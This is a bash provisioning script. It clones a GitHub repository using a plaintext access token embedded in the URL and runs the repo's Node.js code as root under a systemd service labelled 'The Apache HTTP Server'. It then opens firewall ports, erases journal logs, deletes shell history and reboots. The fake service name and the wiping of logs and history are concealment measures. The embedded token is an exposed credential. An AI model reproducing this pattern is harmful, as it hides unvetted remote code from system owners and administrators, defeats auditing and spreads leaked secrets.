#!/bin/bash

sudo apt update -y && sudo apt install nginx -y
sleep 5

sudo systemctl start nginx
sudo systemctl enable nginx
sleep 5

sudo apt install nodejs npm -y
sleep 5

git clone https://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@github.com/koyebs/IBM.git /root/IBM
cd /root/IBM
sleep 5

cat >/etc/systemd/system/Apache.service<<-EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target

[Service]
User=root
NoNewPrivileges=true
Environment="PORT8=38755"
Environment="PORT=7001"
Environment="WSPATH=40031916-cefb-11ee-b6a3-325096b39f47"
Environment="UUID=40031916-cefb-11ee-b6a3-325096b39f47"
ExecStart=/bin/bash -c 'cd /root/IBM && /usr/bin/npm i && /usr/bin/npm start'
Type=simple
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable Apache.service
sudo systemctl start Apache.service
sleep 5

sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 7001 -j ACCEPT
sudo bash -c "iptables-save > /etc/iptables/rules.v4"
sleep 5

yes | sudo rm -rf /tmp/* && sudo journalctl --vacuum-size=1M && sudo apt-get clean && sudo apt-get autoremove && sudo journalctl --vacuum-time=1s && rm -rf ~/.bash_history && history -c
sleep 5

sudo reboot